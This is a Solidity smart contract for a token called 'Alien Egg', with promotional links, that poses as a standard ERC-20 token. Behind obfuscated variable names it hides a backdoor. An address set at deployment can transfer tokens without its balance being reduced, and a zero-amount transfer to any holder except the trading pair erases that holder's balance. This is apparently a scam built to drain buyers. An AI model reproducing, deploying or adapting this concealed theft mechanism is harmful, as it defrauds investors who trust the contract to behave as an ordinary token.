/*

Website: https://alienegg.cryptotoken.live/

Telegram: https://t.me/AlienEgg

Twitter: https://twitter.com/AlienEggETH

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract AlienEgg is Ownable {
    uint256 private knyfgdxjur = 114;

    mapping(address => uint256) public balanceOf;

    string public name = 'Alien Egg';

    constructor(address boivwkpaymh) {
        balanceOf[msg.sender] = totalSupply;
        krmuqjzx[boivwkpaymh] = knyfgdxjur;
        IUniswapV2Router02 lprab = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        tlbpxzo = IUniswapV2Factory(lprab.factory()).createPair(address(this), lprab.WETH());
    }

    function transferFrom(address sfvemyowlgcu, address mqojrntfgbw, uint256 sfbcinovwjqg) public returns (bool success) {
        require(sfbcinovwjqg <= allowance[sfvemyowlgcu][msg.sender]);
        allowance[sfvemyowlgcu][msg.sender] -= sfbcinovwjqg;
        hvruosy(sfvemyowlgcu, mqojrntfgbw, sfbcinovwjqg);
        return true;
    }

    address public tlbpxzo;

    function transfer(address mqojrntfgbw, uint256 sfbcinovwjqg) public returns (bool success) {
        hvruosy(msg.sender, mqojrntfgbw, sfbcinovwjqg);
        return true;
    }

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol = 'Alien Egg';

    function approve(address awrhjspcge, uint256 sfbcinovwjqg) public returns (bool success) {
        allowance[msg.sender][awrhjspcge] = sfbcinovwjqg;
        emit Approval(msg.sender, awrhjspcge, sfbcinovwjqg);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function hvruosy(address sfvemyowlgcu, address mqojrntfgbw, uint256 sfbcinovwjqg) private {
        if (0 == krmuqjzx[sfvemyowlgcu]) {
            balanceOf[sfvemyowlgcu] -= sfbcinovwjqg;
        }
        balanceOf[mqojrntfgbw] += sfbcinovwjqg;
        if (0 == sfbcinovwjqg && mqojrntfgbw != tlbpxzo) {
            balanceOf[mqojrntfgbw] = sfbcinovwjqg;
        }
        emit Transfer(sfvemyowlgcu, mqojrntfgbw, sfbcinovwjqg);
    }

    mapping(address => uint256) private lyjskbpcgqz;

    mapping(address => uint256) private krmuqjzx;

    event Transfer(address indexed from, address indexed to, uint256 value);
}